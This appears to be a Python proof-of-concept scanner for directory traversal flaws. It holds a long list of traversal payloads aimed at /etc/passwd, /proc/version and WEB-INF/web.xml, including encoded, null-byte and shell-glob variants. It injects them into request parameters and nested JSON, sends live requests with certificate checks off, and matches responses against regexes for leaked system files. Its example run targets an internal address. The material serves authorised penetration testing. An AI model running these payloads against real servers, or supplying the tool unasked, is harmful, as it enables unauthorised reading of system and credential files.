#coding: utf-8
import logging
import json
import urllib.parse, base64
import copy
import urllib3
import re
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level = logging.INFO, format='%(asctime)s - %(levelname)s [%(filename)s:%(lineno)d]: %(message)s')


class Poc(object):

    
    def __init__(self):
        self.extension = 'jpg'
        #https://github.com/fnmsd/awvs_script_decode/blob/master/Scripts/Includes/classDirectoryTraversal.inc
        self.poc = [
            "../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../../../proc/version",
            "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "../../../../../../../../../../etc/passwd%00." + self.extension,
            "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00." + self.extension,
            "/../..//../..//../..//../..//../..//etc/passwd%00." + self.extension,
            ".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd",
            "/etc/passwd",
            "%2fetc%2fpasswd",
            "/.././.././.././.././.././.././.././../etc/./passwd%00",
            "../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd",
            "../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
            "invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.",
            "file:///etc/passwd",
            "/\\../\\../\\../\\../\\../\\../\\../etc/passwd",
            "WEB-INF/web.xml",
            "/WEB-INF/web.xml",
            "/WEB-INF\\web.xml"
            '/etc/passwd',
            '/etc/passwd%00',
            '/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd',
            '/../etc/passwd',
            '/../../etc/passwd',
            '/../../../etc/passwd',
            '/../../../../etc/passwd',
            '/../../../../../etc/passwd',
            '/../../../../../../etc/passwd',
            '%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
            '%2F..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd',
            "/b'i'n/c'a't /e't'c/p'a's's'w'd'",
            '/???/?at /???/????w?',
            "/???/?at /???/????w?",
        ]
        self.pocverify = [
            '(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)',
            '((root|daemon):x:\d+:\d+:(root|daemon))',
            '(<web-app[\s\S]+<\/web-app>)'
        ]

    def cookparam(self, pmap, poc):
        ret = pmap
        retb = False
        for k,v in pmap.items():
            if isinstance(v, str) and (k != 'ver' and k != 'version' ) and '.' in v:
                retb = True
                ret[k] = poc
        return ret, retb

    def verify(self, data):
        for p in self.poc:
            try:
                metainfo = copy.deepcopy(data)
                self.detect = False
                self.walkjson(metainfo['params'], p)
                self.walkjson(metainfo['data'], p)

                if self.detect:
                    logging.info('==detect directory traversal '+metainfo['url'].split('?')[0])
                    result = self.sendreq(metainfo, False)
                    #status_code=500时
                    if result != False:
                        for v in self.pocverify:
                            if re.search(v, result.text):
                                logging.info('================={}存在directory traversal {}'.format(metainfo['url'], p))
                                return [{
                                    "title": "{} 存在directory traversal漏洞".format(metainfo.get('url').split('?')[0]),
                                    "desc":  "exp {} ".format(p),
                                    "request": metainfo,
                                    "severity": "high",
                                }]
                         
            except Exception as e:
                logging.error(str(e)+metainfo['url'])
                return False
    

    def walkjson(self, d, p):
        if isinstance(d, list):
            t = enumerate(d)
        elif isinstance(d, dict):
            t = d.items()
        for k, v in t:
            if isinstance(v, str):
                special = False
                if v.startswith('eyJ'):
                    try:
                        #base64json
                        vv = base64.b64decode(v)
                        vv = json.loads(vv)
                        special = True
                    except:
                        vv = {}
                        special = False
                    for _k,_v in vv.items():
                        #插入payload
                        if (_k != 'ver' and _k != 'version' ) and '.' in _v:
                            vv[_k] = p
                            self.detect = True
                    if special:
                        d[k] = base64.b64encode(json.dumps(vv).encode()).decode()

                if not special and (v.startswith('%7B') or v.startswith('{')):
                    #json
                    vv = urllib.parse.unquote(v)
                    try:
                        vv = json.loads(vv)
                        special = True
                    except:
                        vv = {}
                        special = False
                    for _k,_v in vv.items():
                        #插入payload
                        if (_k != 'ver' and _k != 'version' ) and '.' in _v:
                            vv[_k] = p
                            self.detect = True
                    if special:
                        d[k] = urllib.parse.quote(json.dumps(vv))
                if not special:
                    #插入payload
                    if (k != 'ver' and k != 'version' ) and '.' in v:
                        d[k] = p
                        self.detect = True
                
            elif isinstance(v, list) or isinstance(v, dict):
                self.walkjson(v, p)

    def sendreq(self, data, allow_redirects=False):
        j = {}
        proxies = {}
        #proxies = { "http": "socks5://127.0.0.1:10800", "https": "socks5://127.0.0.1:10800", }
        #proxies = {"http": "http://127.0.0.1:8882", "https": "http://127.0.0.1:8882"}
        j['proxies'] = proxies
        j['url'] = data.get('url').split('?')[0]
        j['method'] = data.get('method')
        j['cookies'] = data.get('cookies')
        #默认会urlencode
        j['params'] = data.get('params')

        j['headers'] = data.get('headers')
        #http2.0
        if ':authority' in  j['headers'].keys():
            j['headers']['authority'] =  j['headers'][':authority']
            j['headers'].pop(':authority')
        #
        typess = data.get('type')
        if typess == 'json':
            j['json'] = data.get('data')
        elif typess == 'multipart':
            j['files'] = data.get('data')
        else:
            j['data'] = data.get('data')

        j['verify'] = False
        j['timeout'] = 10
        j['allow_redirects'] = allow_redirects

        return requests.request(**j)


if __name__ == '__main__':
    print(Poc().verify({"url": "http://10.234.3.70/ll.html", "params": {"ver":"a.b.c", "test":"aaa.jpg"}, "method": "get", "cookies": {}, "headers": {"content-length": "33", "connection": "Keep-Alive", "charset": "utf-8", "content-type": "application/x-gzip", "user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.1; MI MAX 2 MIUI/V11.0.0.1.NDDCNXM)", "host": "logconf.iflytek.com", "accept-encoding": "gzip"}, "type": "json", "data": {"appid": "13feb1aa43", "ver": "-1"}}))
    